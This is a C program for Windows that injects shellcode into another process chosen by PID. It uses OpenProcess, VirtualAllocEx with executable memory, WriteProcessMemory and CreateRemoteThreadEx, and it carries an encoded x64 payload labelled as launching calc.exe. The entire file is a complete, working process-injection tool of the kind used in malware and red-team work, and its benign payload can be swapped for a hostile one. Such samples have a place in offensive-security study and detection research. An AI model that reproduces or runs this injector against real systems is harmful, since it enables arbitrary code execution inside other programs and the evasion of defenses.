#include <stdio.h>
#include <Windows.h>

#define REQUIRED_ARGC 2UL

int main(int argc, char* argv[])
{

	// Thread Safe Calc.exe Shellcode
	unsigned char calc[] =
		"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef"
		"\xff\xff\xff\x48\xbb\x63\xd2\xb7\xe8\xdc\x9b\x33\xb0\x48"
		"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x9f\x9a\x34"
		"\x0c\x2c\x73\xf3\xb0\x63\xd2\xf6\xb9\x9d\xcb\x61\xe1\x35"
		"\x9a\x86\x3a\xb9\xd3\xb8\xe2\x03\x9a\x3c\xba\xc4\xd3\xb8"
		"\xe2\x43\x9a\x3c\x9a\x8c\xd3\x3c\x07\x29\x98\xfa\xd9\x15"
		"\xd3\x02\x70\xcf\xee\xd6\x94\xde\xb7\x13\xf1\xa2\x1b\xba"
		"\xa9\xdd\x5a\xd1\x5d\x31\x93\xe6\xa0\x57\xc9\x13\x3b\x21"
		"\xee\xff\xe9\x0c\x10\xb3\x38\x63\xd2\xb7\xa0\x59\x5b\x47"
		"\xd7\x2b\xd3\x67\xb8\x57\xd3\x2b\xf4\xe8\x92\x97\xa1\xdd"
		"\x4b\xd0\xe6\x2b\x2d\x7e\xa9\x57\xaf\xbb\xf8\x62\x04\xfa"
		"\xd9\x15\xd3\x02\x70\xcf\x93\x76\x21\xd1\xda\x32\x71\x5b"
		"\x32\xc2\x19\x90\x98\x7f\x94\x6b\x97\x8e\x39\xa9\x43\x6b"
		"\xf4\xe8\x92\x93\xa1\xdd\x4b\x55\xf1\xe8\xde\xff\xac\x57"
		"\xdb\x2f\xf9\x62\x02\xf6\x63\xd8\x13\x7b\xb1\xb3\x93\xef"
		"\xa9\x84\xc5\x6a\xea\x22\x8a\xf6\xb1\x9d\xc1\x7b\x33\x8f"
		"\xf2\xf6\xba\x23\x7b\x6b\xf1\x3a\x88\xff\x63\xce\x72\x64"
		"\x4f\x9c\x2d\xea\xa0\x66\x9a\x33\xb0\x63\xd2\xb7\xe8\xdc"
		"\xd3\xbe\x3d\x62\xd3\xb7\xe8\x9d\x21\x02\x3b\x0c\x55\x48"
		"\x3d\x67\x7b\x2e\x9a\x69\x93\x0d\x4e\x49\x26\xae\x4f\xb6"
		"\x9a\x34\x2c\xf4\xa7\x35\xcc\x69\x52\x4c\x08\xa9\x9e\x88"
		"\xf7\x70\xa0\xd8\x82\xdc\xc2\x72\x39\xb9\x2d\x62\x8b\xbd"
		"\xf7\x50\x9e\x06\xaa\xd2\xe8\xdc\x9b\x33\xb0";

    // Make sure our PID argument gets passed
	if (argc != REQUIRED_ARGC) {
		fprintf(stderr, "[!] Usage: program.exe <PID>\n");
		return EXIT_FAILURE;
	}

	// Setup Process Variables
	DWORD PID = NULL;
	DWORD TID = NULL;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	LPVOID lpBuffer = NULL;

	// Take the first arg and convert to int and assign to PID
	PID = atoi(argv[1]);

	fprintf(stdout, "[+] Trying to open a handle to process (%ld)\n", PID);

	// Open a HANDLE to the target process
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	// Make sure our HANDLE isn't NULL
	if (hProcess == NULL)
	{
		fprintf(stderr, "[!] couldn't get a handle to the process (%ld), erro: %ld", PID, GetLastError());
		return EXIT_FAILURE;
	}

	fprintf(stdout, "[+] Got a handle to the process!\n\t\\---0x%p\n", hProcess);

	// Allocate bytes to memory
	lpBuffer = VirtualAllocEx(hProcess,
		NULL,
		sizeof(calc),
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_EXECUTE_READWRITE
        );

	fprintf(stdout, "[+] Allocated % zu - bytes with PAGE_EXECUTE_READWRITE permissions\n", sizeof(calc));

	// Write our shellcode to the target process' memory
	WriteProcessMemory(hProcess,
		lpBuffer,
		calc,
		sizeof(calc),
		NULL
        );

	fprintf(stdout, "[+] write % zu - bytes to process memory\n", sizeof(calc));

	// Execute the thread in the target process
	hThread = CreateRemoteThreadEx(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)lpBuffer,
		NULL,
		0,
		0,
		&TID
        );

	// Make sure the HANDLE to our thread is not NULL
	if (hThread == NULL)
	{
		fprintf(stderr, "[!] failed to get a handle to the thread, error: %ld\n", GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	fprintf(stdout, "[+] Got a handle to the thread (%ld)\n\t\\---0x%p\n", TID, hThread);

	// Execute the thread
	WaitForSingleObject(hThread, INFINITE);
	fprintf(stdout, "[+] thread is finished executing\n");

	// Cleanup
	fprintf(stdout, "[+] Cleaning up...\n");
	CloseHandle(hThread);
	CloseHandle(hProcess);
	fprintf(stdout, "[+] Finished\n");

	return EXIT_SUCCESS;
}
